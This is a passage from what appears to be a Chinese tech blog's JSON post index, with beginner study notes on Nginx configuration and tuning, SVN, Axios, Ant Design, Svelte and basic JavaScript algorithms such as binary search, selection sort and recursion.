index.html;\r}\r}\r在该配置中，访问abc.xiaochenabc123.test.com会反向代理到http://xiaochenabc123.test.com中\nNginx命令（例如nginx -s quit）\n查看帮助\nnginx -?或者nginx -h\n使用指定配置文件\nnginx -c nginx-01.conf\n指定配置指令（覆盖nginx.conf内的指令）\nnginx -g \u0026ldquo;user root;\u0026rdquo;\n立即关闭nginx服务\nnginx -s stop\n处理完毕全部请求后再停止服务\nnginx -s quit\n重载配置文件\nnginx -s reload\n重新记录日志\nnginx -s reopen\n查看配置文件是否出错（大小写都可以）\nnginx -t\n查看nginx信息（大V是编译信息小写v是版本信息）\nnginx -v\n指定nginx运行目录\nnginx -p /nginx/\n开启缓存\nproxy_cache_path /data/cache levels=1:2 keys_zone=oncache:10m max_size=10g inactive=60m;\n/data/cache是缓存目录，levels是缓存目录的优先级，例如1:2（二级目录），表示/data是一级目录，/cache是二级目录，keys_zone是定义共享内存区的名称和大小（oncache是名称，10m是内存区的大小），max_size是缓存的最大大小，inactive表示该缓存不在该指定时间内被访问，将从缓存中删除\nproxy_cache_path的上下文是http段\nGoaccess（可视化监控access日志）\nSSL证书\n申请人通过登记机构（具备验证申请人的身份）发送证书签名申请（CSR）到CA机构，CA机构再将公钥私钥发送给登记机构，登记机构再给申请人\n当访问服务端时，会发送申请证书的请求，服务端接收到请求时会将公钥发送给客户端，客户端会验证证书的有效性，CA会将过期证书发送给CRL服务器（浏览器验证时发送请求给CRL服务器）（性能很差），一般通过OCSP（在线证书状态协议）验证，OCSP是服务端主动获取的结果，然后随着握手协商时发送给客户端，不需要客户端去验证\n开启OCSP Stapling\nserver {\rlisten 443 ssl;\rserver_name test.xiaochenabc123.test.com;\rssl_stapling on;\rssl_stapling_verify on;\rresolver 8.8.8.8 8.8.4.4 valid=300s; #OCSP请求的DNS服务器\rresolver_timeout 5s;\rssl_trusted_certificate nginx.pem; #证书公钥（pem格式）\r}\r查看是否开启OCSP Stapling\nopenssl.exe s_client -connect https://test.xiaochenabc123.test.com:443 -status\n没有开启会返回OCSP response: no response sent\nnginx负载均衡（将请求转发给多个服务端去执行，每个服务端的任务一般是一样的）\nnginx配置\nupstream test_server{\rserver 198.168.1.2:81 weight=10 max_conns=3000 fail_timeout=10s max_fails=3; #权重为10（默认为1，指定该上游服务端的最大并发连接数为1000，在10秒内判断2次上游服务端不可用时，将在这10秒内不进行请求转发\rserver 198.168.1.3:82 weight=1 max_conns=500 fail_timeout=10s max_fails=2;\rserver 198.168.1.4:83 weight=5 max_conns=1000 fail_timeout=10s max_fails=2 backup; # backup，备用服务端标记，只有当其他服务端不可用时才进行请求转发，down，标记是离线服务端，不会进行请求转发\rserver 198.168.1.5:80 weight=5 max_conns=1000 fail_timeout=10s max_fails=2;\rserver 198.168.1.6:8080 weight=10 max_conns=2000 fail_timeout=10s max_fails=2;\rserver 198.168.1.7:85 weight=5 max_conns=1000 fail_timeout=10s max_fails=2 down;\rserver test1.xiaochenabc123.test.com:5000 weight=20 max_conns=5000 fail_timeout=10s max_fails=5;\rkeepalive 32; # worker子进程与上游服务端空闲的长连接数为32\rkeepalive _requests 50; # 每个长连接最多只能处理50个HTTP请求（默认值为100）\rkeepalive _timeout 30s; #nginx与上游服务端空闲长连接的最长生存时间，默认为60秒\r}\rserver{\rlisten 80;\rserver_name test.xiaochenabc123.test.com\rlocation /test/ {\rproxy_pass http://test_server;\r}\r}\r测试\ncurl test.xiaochenabc123.test.com\n负载均衡算法\n哈希算法（根据某些参数来决定，只有参数不变时将一直使用该代理服务）\nupstream test_server1{\rhash $request_uri; # 当uri不发送改变，那么负责处理该请求的上游服务端将会一直不变，也可以是其他参数\rserver 198.168.1.2:80;\rserver 198.168.1.3:80;\r}\rip_hash算法\nupstream test_server1{\rip_hash; # 根据ip来决定，如果ip不发生改变，将一直使用该代理服务\rserver 198.168.1.2:80;\rserver 198.168.1.3:80;\r}\r最少连接数算法\nupstream test_server1{\rzone testserver 10M; # 创建共享内存，通过共享内存来让全部的worker子进程对负载均衡策略生效，上游服务的状态数据都存放在该功能内存中\rleast_conn; # 选择连接数最少的服务端，并且对该服务端进行加权，让它能够获取更多连接\rserver 198.168.1.2:80;\rserver 198.168.1.3:80;\r}\r性能优化\nworker子进程数，worker_processes 8;\nworker子进程与CPU核心绑定，如果是4个CPU核心，worker_cpu_affinity 0001 0010 0100 1000;\nworker子进程与CPU核心绑定的好处：更好的利用CPU核心内部的一级缓存，二级缓存（增加缓存命中率）\n位数表示使用多少个核心，个数为多少个进程，如果是0101 1010，将表示4个核心，使用2个进程\n设置worker子进程的优先级，worker_priority -20;\n提高worker子进程的优先级，可以分配更大的CPU时间片，让worker子进程更优先的进行工作\n优先级为-20到19，值越小优先级越高\n延迟处理新连接的请求，listen 80 deferred;\ndeferred表示在3次握手中，检测到客户端进行http请求数据时，tcp状态才设置连接成功（tcp连接成功会唤醒nginx进程，如果没有请求数据，只进行连接TCP，完全没有必要nginx进程），否则丢弃\n优化TCP连接\n当nginx作为中间件时，向上游服务获取数据时，需要进行TCP连接，对下游客户端也是需要进行TCP连接\n以下配置都是要用到/etc/sysctl.conf的系统控制文件，这个文件是配置内核参数等信息的\nnet.ipv4.tcp_syn_retries = 6，这个设置决定了上游（上游一直没有返回SYN+ACK包）在TCP连接中超时，最多重发多少次SYN包，在Linux下默认为6，并且TCP连接超时为127秒，这个值越小，认定TCP连接超时的时间越短，认定TCP连接超时会关闭连接（占用TCP连接会消耗CPU和内存）\nnet.ipv4.tcp_synack_retries = 5，这个设置决定了SYN+ACK确认包的重发次数，默认为5，这个值越小，认定TCP连接超时的时间越短\nnet.ipv4.tcp_syncookies = 1，1为开启tcp_syncookies，在进行TCP第一次握手时，如果syn_backlog队列满了，会丢弃SYN包，开启tcp_syncookies将不会丢弃，而是使用syncookie进行握手\nnet.core.netdev_max_backlog = 262144，决定能接收数据包的最大长度队列\nnet.core.somaxconn = 128，决定同时发起的TCP连接数，默认为128，可以调高该值，避免连接超时或者重传\nnet.ipv4.tcp_max_orphans = 16384，决定孤立连接（主动断开方关闭进程，表示进程与这个连接没有关系了，就成了孤立连接，也就是FIN_WAIT1状态）的最大数量，当孤立连接超过该值，后续新增的孤立连接将不会走4次挥手流程，而是直接通过发送RST报文来强制关闭连接\nnet.ipv4.tcp_max_syn_backlog = 128，决定处于SYN_RECV状态的TCP连接数（第二次握手，服务端发送SYN确认包后），超过设置数会丢弃第三次的SYN报文\nnet.ipv4.tcp_abort_on_overflow = 1，决定了TCP连接建立完成后，如果backlog队列满了，TCP连接将回退到SYN+ACK状态，开启该设置，会发送RST包给客户端，进行终止该词连接，如果没有必要请勿开启\nnet.ipv4.ip_local_port_range = 32768 61000，限制服务端对外和本地的端口范围（每个TCP连接都需要占用一个本地的端口，如果本地端口满了，将无法创建新的TCP连接）\nnet.ipv4.tcp_tw_reuse = 1，复用TIME_WAIT状态的连接，开启这个可以快速复用TIME_WAIT状态的连接\nnet.ipv4.tcp_fastopen = 1，TFO功能，开启该功能会在三次握手时，发送syn包给上游，上游根据ip生成cookie，并且和syn+ack一起发送给下游（下游缓存这个cookie），下游与上游进行第二连接时，发送syn包给上游会携带这个cookie，上游验证后发送SYN-ACK包，就可以发送数据（数据在SYN包中），省去第三次握手，下游发送ACK确认上游的数据，如果cookie无效，将会丢弃SYN包中的数据，发送正常的SYN-ACK包，并且完成第三次握手，进行TFO功能的TCP连接依赖于这个cookie\n/etc/sysctl.conf配置生效可以使用sysctl -p命令\n","permalink":"https://99999.fun/posts/85/","summary":"Nginx是目前web服务器占比第一（在https://w3techs.com 中可以看到Nginx占比33.1%）\nNginx支持静态资源提供服务，支持高并发，热部署，反向代理，缓存，负载均衡等功能，Nginx使用BSD许可证开源（允许修改Nginx源码来重新发布一个商业用途的（例如Tengine））\nNginx由Nginx二进制可执行文件，Nginx.conf，access.log，error.log组成\nNginx和Nginx plus的区别：Nginx开源，免费，Nginx plus闭源，不免费\nNginx编译安装\nMainline version版本是提供最新的功能，Stable version版本是目前的稳定版本，Legacy versions版本是过去的版本\n下载Nginx\nwget http://nginx.org/download/nginx-1.22.0.tar.gz\n解压Nginx压缩包\ntar -xzf nginx-1.22.0.tar.gz\n其中auto目录有4个子目录（分别为cc（用于编译），lib（lib库），os（操作系统的判断），types（类型判断）），conf目录是Nginx配置目录，html目录是Nginx默认静态文件\nconf目录是Nginx配置文件目录（例如nginx.conf），src目录是Nginx源代码目录\n进入nginx目录然后进行编译\n查看编译时支持的参数\n./configure \u0026ndash;help | more\n使用默认参数编译\n./configure \u0026ndash;prefix=/home/nginx\n编译完成的中间文件存会放在objs文件夹下\nngx_module.c是要编译进Nginx的模块，如果需要安装第三方模块需要在其修改\nmake编译\nmake install安装\n进入/home/nginx，可以看到已经安装完成\n安装\n编译安装\napt install -y gcc gcc-c++ pcre pcre-devel openssl openssl-devel zlib zlib-devel\nwget http://nginx.org/download/nginx-1.22.0.tar.gz\ntar -zxvf nginx-1.18.0.tar.gz\ncd nginx-1.18.0\nmake \u0026amp;\u0026amp;make install\n一键安装（不推荐）\napt install nginx\n检查是否安装完毕\nnginx -v\nnginx配置文件nginx.conf解读，一般在/etc/nginx下\nuser root; # nginx运行用户\rworker_processes auto; # nginx进程数，一般会设置和CPU核数一致\rerror_log /www/wwwlogs/nginx_error.","title":"简单使用Nginx HTTP服务器软件"},{"content":"SVN全名Subversion，即版本控制系统\n和Git不同，Git是分布式，而SVN是集中式\n在commit没有冲突的时候，会合并\n而存在冲突那么就需要先手动处理冲突再commit\n源代码库：源代码统一存放的地方\n获取：到源代码库获取一份源代码\n提交：已经修改了源代码，想提交到源代码库\n更新：更新同步和源代码库一样的源代码\n安装SVN\ndnf install subversion\n创建版本库\ncd /svn/demo\nsvnadmin create /svn/demo\n其中conf/svnserve.conf文件是svn服务配置文件\nanon-access = read auth-access = write password-db = passwd authz-db = authz realm = /svn/demo\npasswd文件为账号密码文件\n格式为：账号=密码，例如：abc = root\nauthz为权限控制文件\n格式为：账号=rw（r读，w写），例如：abc=rw\n启动版本库\nsvnserve -d -r /svn/demo \u0026ndash;listen-port 3690\n\u0026ndash;listen-port是指定svn监听端口，默认是3690，-r是指定版本库\n停止svn服务\nkillall svnserve\n检出：从版本库中创建副本，在其修改，再提交到版本库中\n例如：\nsvn checkout svn:xxx/demo \u0026ndash;username=root\n因为root有读写权限，因此将会在本地获取到demo的副本\n更新：更新副本，将其同步到版本库最新版本，如果不是当前最新版本，当前本地的副本将无效\nsvn update\n默认是更新到最新版本，也可以指定更新到哪个版本\nsvn update -r 2 demo\n提交\nsvn commit -m \u0026ldquo;hello svn\u0026rdquo;\n查看副本状态\nsvn status\n如果出现?，则表示还没有加入版本控制中，出现A，表示已经加入版本控制中\n添加文件到版本控制中\nsvn add demo\nadd只是将其添加到版本控制中，还没有提交到版本库中\n提交到版本库中\nsvn commit -m \u0026ldquo;hello svn\u0026rdquo;\n版本回退（当想放弃当前文件的修改，想恢复到之前的文件）\nsvn revert -R demo\n将demo目录回退到修改之前的状态，不加-R则是文件回退\n当然也可以回退到指定版本\nsvn revert -R 2:1 demo\n从版本2回退到版本1\n查看历史信息\n查看指定版本之间的信息（版本作者，日期，路径）\nsvn log -r 2:1\n查看文件的版本修改信息\nsvn log /demo/index.html\n获取目录和显示指定条数的\nsvn log -l 2 -v\n查看历史修改情况（比如本地修改，副本和版本库）\nsvn diff\n默认会比较副本文件和缓存在.svn中的原始的改变\n比较副本和指定版本\nsvn diff -r 2 index.html\n版本和版本的比较\nsvn diff -r 1:2 index.html\n查看过去版本的内容\nsvn cat -r 2 index.html\n查看远程库的文件列表（不下载）\nsvn list svn:xxx/demo\n分支\n创建分支\n切换分支\n合并分支\n标签\n","permalink":"https://99999.fun/posts/84/","summary":"SVN全名Subversion，即版本控制系统\n和Git不同，Git是分布式，而SVN是集中式\n在commit没有冲突的时候，会合并\n而存在冲突那么就需要先手动处理冲突再commit\n源代码库：源代码统一存放的地方\n获取：到源代码库获取一份源代码\n提交：已经修改了源代码，想提交到源代码库\n更新：更新同步和源代码库一样的源代码\n安装SVN\ndnf install subversion\n创建版本库\ncd /svn/demo\nsvnadmin create /svn/demo\n其中conf/svnserve.conf文件是svn服务配置文件\nanon-access = read auth-access = write password-db = passwd authz-db = authz realm = /svn/demo\npasswd文件为账号密码文件\n格式为：账号=密码，例如：abc = root\nauthz为权限控制文件\n格式为：账号=rw（r读，w写），例如：abc=rw\n启动版本库\nsvnserve -d -r /svn/demo \u0026ndash;listen-port 3690\n\u0026ndash;listen-port是指定svn监听端口，默认是3690，-r是指定版本库\n停止svn服务\nkillall svnserve\n检出：从版本库中创建副本，在其修改，再提交到版本库中\n例如：\nsvn checkout svn:xxx/demo \u0026ndash;username=root\n因为root有读写权限，因此将会在本地获取到demo的副本\n更新：更新副本，将其同步到版本库最新版本，如果不是当前最新版本，当前本地的副本将无效\nsvn update\n默认是更新到最新版本，也可以指定更新到哪个版本\nsvn update -r 2 demo\n提交\nsvn commit -m \u0026ldquo;hello svn\u0026rdquo;","title":"SVN版本控制系统学习笔记"},{"content":"Axios是一个基于promise的http网络请求库，可以用于浏览器和nodejs，在nodejs中使用http模块，而在浏览器使用XMLHttpRequests\n支持promise api，支持拦截请求和响应，转换请求数据和响应数据，取消请求，自动转换json数据，支持防御XSRF攻击\n安装\nyarn add axios\n实例demo\nimport axios from \u0026quot;axios\u0026quot;;\raxios.get(\u0026quot;https://httpbin.org/get\u0026quot;, {\rparams: {\rname: \u0026quot;root\u0026quot;\r}\r})\r.then(function (response) {\rconsole.log(response);\r})\r.catch(function (error) {\rconsole.log(error);\r});\raxios.post(\u0026quot;https://httpbin.org/post\u0026quot;, {\rname: \u0026quot;root\u0026quot;,\rpass: \u0026quot;root\u0026quot;\r})\r.then(function (response) {\rconsole.log(response);\r})\r.catch(function (error) {\rconsole.log(error);\r});\r可以看到页面已经发送了get和post请求，.then和.catch分别表示请求成功和请求失败时调用的函数，也可以用箭头函数，其中response参数为请求的数据，error为错误信息\n还可以写成这样\naxios({\rmethod: 'post',\rurl: 'https://httpbin.org/post',\rdata: {\rname: \u0026quot;root\u0026quot;,\rpass: \u0026quot;root\u0026quot;\r}\r});\rFormData方式\nlet data = {\rhome: \u0026quot;hallo\u0026quot;,\rmain: \u0026quot;abc\u0026quot;\r}\rlet formData = new FormData()\rfor(let key in data){\rformData.append(key,data[key])\r}\raxios.post('https://httpbin.org/post',formData).then(\rres =\u0026gt;{\rconsole.log(res)\r}\r)\rput和patch\nlet data = {\rhome: \u0026quot;hallo\u0026quot;,\rmain: \u0026quot;abc\u0026quot;\r}\raxios.put(\u0026quot;/put\u0026quot;,data).then(res =\u0026gt;{\rconsole.log(res)\r})\raxios.patch(\u0026quot;/patch\u0026quot;,data).then(res =\u0026gt;{\rconsole.log(res)\r})\rdelete请求\naxios.delete(\u0026quot;/delete\u0026quot;,{\rparams: {\rhome: \u0026quot;hallo\u0026quot;\r}\r}).then(res =\u0026gt;{\rconsole.log(res)\r})\r注意：params是在URL上使用，而data就不是在URL上使用（Request Payload）\n并发请求（同时进行多个请求，并且统一处理返回值）\naxios.all([\raxios.get(\u0026quot;https://httpbin.org/get\u0026quot;),\raxios.get(\u0026quot;/data.json\u0026quot;)\r]).then(\raxios.spread((urlRes,dataRes)=\u0026gt;{\rconsole.log(urlRes,dataRes)\r})\r)\r注意：实质上进行请求的时候还是有个顺序的，具体顺序是看axios.all里面的数组元素，只是提供了统一管理请求而且\n请求返回的数据，其中config是一些请求信息，包含请求方式，文件路径等等，请求到的真实数据实质上是在response.data里，还有像status（状态码），headers（请求头）等等都有\n常见请求方式：get，post，put，patch，delete\nput和patch一般是用来更新数据，区别就是put要将所有数据推送到后端，patch只将修改过的数据推送到后端，delete是用来删除数据，具体还得看后端怎么定义\nparams: 请求参数拼接到url中，data：请求参数放在请求体中\naxios实例\nlet AxiosDemo = axios.create({\rbaseURL:\u0026quot;http://localhost:8080\u0026quot;\rtimeout: 1000\r})\rAxiosDemo.get(\u0026quot;/demo.json\u0026quot;).then(res =\u0026gt;{\rconsole.log(res)\r}\r)\r或者直接访问属性来定义\nlet instance = axios.create()\rinstance.default.timeout = 1000\rinstance.defaults.baseURL = 'http://localhost:8080'\r当多个接口的超时时长（timeout）不同或者需要访问服务地址（服务请求或者响应的结构可能不同时）有多个的时候就可以使用实例化axios来自定义，超时（timeout）默认为1000毫秒，超出就返回超时401\n也可以搞全局配置\naxios.defaults.baseURL = 'http://localhost:8080'\raxios.defaults.timeout = 1000\r拦截器（请求或者响应被处理之前拦截）\n请求拦截器\naxios.interceptors.request.use(config =\u0026gt;{\rreturn config\r},err=\u0026gt;{\rreturn Promise.reject(err)\r})\r可以看到有两个参数，第一个是发送请求前要进行处理什么东西的回调函数，另一个是在请求错误的时候应该处理什么的回调函数\n响应拦截器\naxios.interceptors.response.use(res =\u0026gt;{\rreturn res\r},err=\u0026gt;{\rreturn Promise.reject(err)\r})\r可以看到有两个参数，第一个是当请求成功后对响应数据要进行处理什么东西的回调函数，另一个是在响应错误的时候应该处理什么的回调函数\n取消拦截器\nlet interceptors = axios.interceptors.response.use(config =\u0026gt;{\rconfig.headers.token = \u0026quot;\u0026quot;\rreturn config\r})\raxios.interceptors.request.eject(interceptors)\r注意：不要直接使用对象来声明一个属性的值，而是应该使用点来访问属性来定义，否则其他属性都会被覆盖掉，例如：\nconfig.headers ={\rauth: true\rtoken = \u0026quot;\u0026quot;\r}\r取消请求\nlet source = axios.CancelToken.source()\raxios.get(\u0026quot;/data.json\u0026quot;,{\rcancelToken: source.token\r}).then(res=\u0026gt;{\rconsole.log(res)\r}).catch(err=\u0026gt;{\rconsole.log(err)\r})\rsource.cancel(\u0026quot;cancel http\u0026quot;)\r解决跨域问题\nheaders: {\r'Content-Type': 'application/x-www-form-urlencoded',\r}\r","permalink":"https://99999.fun/posts/83/","summary":"Axios是一个基于promise的http网络请求库，可以用于浏览器和nodejs，在nodejs中使用http模块，而在浏览器使用XMLHttpRequests\n支持promise api，支持拦截请求和响应，转换请求数据和响应数据，取消请求，自动转换json数据，支持防御XSRF攻击\n安装\nyarn add axios\n实例demo\nimport axios from \u0026quot;axios\u0026quot;;\raxios.get(\u0026quot;https://httpbin.org/get\u0026quot;, {\rparams: {\rname: \u0026quot;root\u0026quot;\r}\r})\r.then(function (response) {\rconsole.log(response);\r})\r.catch(function (error) {\rconsole.log(error);\r});\raxios.post(\u0026quot;https://httpbin.org/post\u0026quot;, {\rname: \u0026quot;root\u0026quot;,\rpass: \u0026quot;root\u0026quot;\r})\r.then(function (response) {\rconsole.log(response);\r})\r.catch(function (error) {\rconsole.log(error);\r});\r可以看到页面已经发送了get和post请求，.then和.catch分别表示请求成功和请求失败时调用的函数，也可以用箭头函数，其中response参数为请求的数据，error为错误信息\n还可以写成这样\naxios({\rmethod: 'post',\rurl: 'https://httpbin.org/post',\rdata: {\rname: \u0026quot;root\u0026quot;,\rpass: \u0026quot;root\u0026quot;\r}\r});\rFormData方式\nlet data = {\rhome: \u0026quot;hallo\u0026quot;,\rmain: \u0026quot;abc\u0026quot;\r}\rlet formData = new FormData()\rfor(let key in data){\rformData.","title":"Axios网络请求库学习笔记"},{"content":"Ant Design是蚂蚁金服技术沉淀出一套基于React的组件库和前端框架\n官网：https://ant.design/index-cn\n使用create-react-app初始项目\nyarn create react-app antd-demo\n运行\nyarn start\n安装antd组件库\nyarn add antd\n通过import { 组件名 } from \u0026ldquo;antd\u0026quot;方式导入antd组件\n导入antd css样式\n@import \u0026lsquo;~antd/dist/antd.css\u0026rsquo;;\n在typescript上使用\nyarn create react-app antd-demo-ts \u0026ndash;template typescript\nAntd的样式使用了less作为开发语言\n第一个实例demo\nimport 'antd/dist/antd.css';\rimport { DatePicker, Space } from 'antd';\rReactDOM.render(\r\u0026lt;Space direction=\u0026quot;vertical\u0026quot;\u0026gt;\r\u0026lt;DatePicker/\u0026gt;\r\u0026lt;/Space\u0026gt;,\rdocument.getElementById('root'),\r); ","permalink":"https://99999.fun/posts/82/","summary":"Ant Design是蚂蚁金服技术沉淀出一套基于React的组件库和前端框架\n官网：https://ant.design/index-cn\n使用create-react-app初始项目\nyarn create react-app antd-demo\n运行\nyarn start\n安装antd组件库\nyarn add antd\n通过import { 组件名 } from \u0026ldquo;antd\u0026quot;方式导入antd组件\n导入antd css样式\n@import \u0026lsquo;~antd/dist/antd.css\u0026rsquo;;\n在typescript上使用\nyarn create react-app antd-demo-ts \u0026ndash;template typescript\nAntd的样式使用了less作为开发语言\n第一个实例demo\nimport 'antd/dist/antd.css';\rimport { DatePicker, Space } from 'antd';\rReactDOM.render(\r\u0026lt;Space direction=\u0026quot;vertical\u0026quot;\u0026gt;\r\u0026lt;DatePicker/\u0026gt;\r\u0026lt;/Space\u0026gt;,\rdocument.getElementById('root'),\r); ","title":"简单使用Ant Design组件库"},{"content":"Svelte的核心思想在于通过静态编译减少框架运行时的代码量\nSvelte风格和vue相似，模板用{}来表示\nSvelte的特点就是没有虚拟DOM（像Vue和React都是用虚拟DOM的）\n初始化\nnpx degit sveltejs/template demo\nyarn\nyarn dev\n修改src\\App.svelte和src\\main.js\n\u0026lt;script\u0026gt;\rlet name = 'world'\r\u0026lt;/script\u0026gt;\r\u0026lt;h1\u0026gt;Hello {name}!\u0026lt;/h1\u0026gt;\r导入组件\nimport Hallo from './hallo.svelte'\r...\r\u0026lt;Hallo/\u0026gt;\r如果想将HTML渲染到组件中可以使用 let string = \u0026lt;div\u0026gt;hallo word\u0026lt;/div\u0026gt; {@html string}\n事件响应\nfunction aClick() {\rcount += 1\r}\r...\r\u0026lt;button on:click={aClick}\u0026gt;{count}\u0026lt;/button\u0026gt; ","permalink":"https://99999.fun/posts/80/","summary":"Svelte的核心思想在于通过静态编译减少框架运行时的代码量\nSvelte风格和vue相似，模板用{}来表示\nSvelte的特点就是没有虚拟DOM（像Vue和React都是用虚拟DOM的）\n初始化\nnpx degit sveltejs/template demo\nyarn\nyarn dev\n修改src\\App.svelte和src\\main.js\n\u0026lt;script\u0026gt;\rlet name = 'world'\r\u0026lt;/script\u0026gt;\r\u0026lt;h1\u0026gt;Hello {name}!\u0026lt;/h1\u0026gt;\r导入组件\nimport Hallo from './hallo.svelte'\r...\r\u0026lt;Hallo/\u0026gt;\r如果想将HTML渲染到组件中可以使用 let string = \u0026lt;div\u0026gt;hallo word\u0026lt;/div\u0026gt; {@html string}\n事件响应\nfunction aClick() {\rcount += 1\r}\r...\r\u0026lt;button on:click={aClick}\u0026gt;{count}\u0026lt;/button\u0026gt; ","title":"Svelte学习笔记"},{"content":"虽然学过java和Python，但是还是JavaScript比较熟练，因此算法学习全部用JavaScript来写\n算法不会被程序语言所限制，也不会一个实现只有一个算法\n常见数据结构（数组，列表，映射，堆栈，队列，哈希表，树，图）\n算法(排序,双指针,查找,分治,动态规划,递归,回溯,贪心,位运算,DFS,BFS)\n大O表示法是专门用来表示算法速度有多快的，不同算法所耗时间的时间增速度不同\n一个算法执行的时间和解决问题的规模大小相关\n假设一个列表有n个元素，遍历全部元素，要执行n次，大O表示法为O(n)\n大O表示法不是表示消耗的时间，而是通过操作元素的次数决定的，一个优秀的算法操作元素次数肯定很少\n时间复杂度：\nO(1): Constant Complexity: Constant 常数复杂度 O(log n): Logarithmic Complexity: 对数复杂度 O(n): Linear Complexity: 线性时间复杂度 O(n^2): N square Complexity 平⽅方 O(n^3): N square Complexity ⽴立⽅方 O(2^n): Exponential Growth 指数 O(n!): Factorial 阶乘\n算法的特点：有穷性（必须要在一定的时间内完成，不能无限循环），确定性（每一条指令都有明确的目的，不产生二义性），可行性（可以通过基础运算来实现），输入输出（要有0个或者多个输入，要有1个或者多个输出）\n删除有序数组中的重复项\n保证有序数组中的元素是不重复的，也就是说不存在重复的元素\n有序数组中重复的肯定是挨着的，只需要遍历数组全部的元素，前面和后面进行比较，如果相同则删除后面的\n例如：\nlet arr = function(nums) {\rif(nums == null || nums.length == 0){\rreturn 0\r}\rlet b = 0\rfor(let a=0;a\u0026lt;nums.length;a++){\rif(nums[b]!=nums[a]){\rnums[++b] = nums[a]\r}\r}\rreturn ++b\r}\rb作为覆盖，a作为查询，当b的值不等于a查询到的值时，b++的值等于a的值，等于的时候b不改变，当不相等再等于到b上\n搜索数组的目标值，返回其索引值\n通过有序整型数组和一个目标值，寻找目标值，并且返回其索引值，当目标值不存在时，返回-1\nlet search = function(nums, target) {\rfor(let a=0;a\u0026lt;nums.length;a++){\rif(nums[a] == target){\rreturn a\r}\r}\rreturn -1\r}\r字符串反转\n将数组nums里面的字符串，顺序倒过来，在不创建新数组的位置前提下\nlet reverseString = function(nums) {\rvar a=0,b=nums.length-1\rwhile(a\u0026lt;b){\rlet temp =nums[a]\rnums[a] = nums[b]\rnums[b] = temp\ra++\rb--\r}\r}\r二分查找\n二分查找实质就是将数组分开，用中间的数值来对目标值进行比较，大了就是减，小了就加\n一直找到最后的那个目标值，这个算法对比冒泡一个个查找更有效，因为其只需要遍历极少的次数\n注意：二分查找必须是有序数组，无序数组没有用，因为它要一个个进行大小比较\n像猜1到100的数，就可以从50开始比较，如果50大了，那么就是1到49之间有目标值，如果猜25，如果小了，那么就是26到49的之间有目标数，一直判断，直到等于目标值，依此类推，每次判断都会少一半的错误值，例如：n个元素的列表，二次查找的只需要log2n次就可以找到目标值（log是指对数，指的是对求幂的逆运算，例如6的3次方就是216，那么用对数表示为log6 216，求6要相乘几次才能得到216这个结果，结果为3）\n例如：\nfunction xyz(list,int){\rvar a = 0\rvar b = list.length -1\rwhile (a \u0026lt;= b) {\rvar c = a + Math.floor((b - a) / 2) if(list[c] \u0026lt; int){\ra = c +1\r}else if(list[c] \u0026gt; int){\rb = c - 1\r}else{\rreturn c\r}\r}\rreturn -1\r}\rvar abc = [1,3,5,6,7,10,30,55,66,99,1234]\rxyz(abc,99)\r如果猜测的次数和列表长度相同，那么就是线性时间（linear time，O(n)），算法的运行时间会以不同的速度而增加，对数为O(log n )\n选择排序（链表和数组）\n链表指的是链表中的元素可以存储在内存的任何地方，链表的优点在于插入元素（删除元素），只需要O(1)就可以了，但是因为它索引的地址是随机的，因此读取一个元素，可能需要O(n)\n数组的优点在于读取元素，只需要O(1)就可以了，而插入元素，就可能需要O(n)了，因为直接插入元素到数组，需要将后面的元素往后移动，而大0表示法是指最糟糕的情况，并不是一定要执行那么多次\n注意：数组索引编号是从0开始的\n选择排序的时间复杂度是O(n²)，该算法是先在找到最大或者最小的元素，放在排序序列的起始位置，然后再从剩余的序列中继续寻找最大或者最小的元素，将其放在已经排序的序列的末尾，重复，一直到全部元素都排序完毕\n例如：\nfunction data(arr) {\rconst len = arr.length // 获取目标的长度\rlet minindex, temp // 定义最小索引和排序存储\rfor (let i = 0; i \u0026lt; len - 1; i++) {\rminindex = i // 获取当前最小索引（待排序）\rfor (let j = i + 1; j \u0026lt; len; j++) {\rif (arr[j] \u0026lt; arr[minindex]) { // 寻找最小的数\rminindex = j //将最小的数的索引进行存储\r}\r}\rtemp = arr[i] // 最小索引的值等于temp\rarr[i] = arr[minindex] // 最小索引的值等于最小的数的索引\rarr[minindex] = temp // 最小的数的索引等于temp\r}\rreturn arr\r}\rconst abc =[1,3,5,2,9,4,6,10,7,18,8]\rdata(abc)\r递归\n\u0026ldquo;Loops may achieve a performance gain for your program. Recursion may achieve a performance gain for your programmer. Choose which is more important in your situation!\u0026rdquo;\u0026mdash;Leigh caldwell\n递归说白了就是递归函数自己调用自己，因为存在自己调用自己的情况，因此要确保递归函数在什么情况就应该停止，而不是无限循环下去，递归函数要有俩个条件，基线条件（base case）和递归条件（recursive），递归条件就是递归函数调用自己，基线条件是在什么条件下不再调用自己（例如将递归条件放在一个if判断中，当满足递归条件就递归，不满足就基线条件）\n栈（call stack）\n栈是一种数据结构，存在着转移控制权，转移数据，清除或者释放数据的特性（临时存储，压入，弹出），可以用来存储多个函数的变量，当需要该变量的时候插入，不需要就弹出，当栈很高的时候，会导致存储了大量函数要调用的变量，会占用大量的内存，因此在这种情况下循环或者尾递归可能更好\n递归：如果一个函数可以在内部调用其本身，那么这个函数是递归函数，函数内部自己调用自己\n递归效果和循环是一致的，所有递归容易出现栈溢出错误（stack overflow），需要加上退出条件return\n例如：\nvar num = 1;\rfunction hallo(){\rconsole.log(num);\rif(num == 10){\rreturn;\r}\rnum++;\rhallo();\r}\rhallo();\r递归求阶乘\n阶乘：指的是一个正整数的阶乘是所有小于及等于该数的积，并且0的阶乘为1\nfunction hallo(num){\rif(num == 1){\rreturn 1;\r}\rreturn num * hallo(num - 1)\r}\rconsole.log(hallo(10)) // 3628800\r递归求斐波那契数列（兔子序列）\n特点，第一个数加第二个数等于第三个数，第二个数加第三个数，依次类推\n因此需要计算得到斐波那契数列对应数字，只需要指定位置的前两项（n-1，n-2）就可以得出第n个斐波那契数列对应的数字\n例如：\nfunction hallo(num){\rif(num == 1 || num == 2){\rreturn 1;\r}\rreturn hallo(num-1) + hallo(num-2);\r}\rconsole.log(hallo(10));\r快速排序\ndivide and 